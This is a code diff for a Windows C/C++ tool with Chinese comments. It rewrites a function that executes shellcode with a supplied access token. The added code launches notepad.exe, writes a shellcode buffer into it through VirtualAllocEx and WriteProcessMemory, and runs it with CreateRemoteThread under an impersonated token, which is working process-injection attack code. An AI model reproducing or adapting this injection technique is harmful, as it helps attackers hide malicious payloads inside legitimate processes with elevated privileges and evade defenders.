@@ -131,6 +131,7 @@ void StartNamedPipe()
 /// g_dwShellcodeSize : 全局变量，存放Shellcode的大小
 /// </summary>
 void ExecuteShellCodeWithToken(HANDLE hToken) {
+	/*
 	HANDLE hThread = INVALID_HANDLE_VALUE;
 	DWORD dwThreadId = 0;
 	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
@@ -140,6 +141,55 @@ void ExecuteShellCodeWithToken(HANDLE hToken) {
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
 	SetThreadToken(&hThread, hToken);
 	ResumeThread(hThread);
+	*/
+	// ---------------------
+
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	LPVOID lpBuffer = NULL;
+	SIZE_T szWritten = 0;
+	HANDLE hProcess = NULL;
+	
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	// 创建进程
+	BOOL bRet = CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL,
+		FALSE,
+		NULL, NULL, NULL,
+		&si, &pi);
+	if (bRet == FALSE) {
+		wprintf(L"[-] Error : %d\n", GetLastError());
+		return;
+	}
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
+
+
+	lpBuffer = VirtualAllocEx(hProcess, NULL, g_dwShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (lpBuffer == NULL) {
+		wprintf(L"[-] VirtualAllocEx Error : %d\n", GetLastError());
+		return;
+	}
+
+	bRet = WriteProcessMemory(hProcess, lpBuffer, g_ShellcodeBuffer, g_dwShellcodeSize, &szWritten);
+	if (bRet == 0) {
+		wprintf(L"[-] WriteProcessMemory Error : %d\n", GetLastError());
+		return;
+	}
+
+	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, CREATE_SUSPENDED, NULL);
+	
+
+	if (hThread == INVALID_HANDLE_VALUE) {
+		wprintf(L"[-] CreateRemoteThread Error : %d\n", GetLastError());
+		return;
+	}
+	SetThreadToken(&hThread, hToken);
+	ResumeThread(hThread);
+
+	return;
+
 }
 
 BOOL Execute()
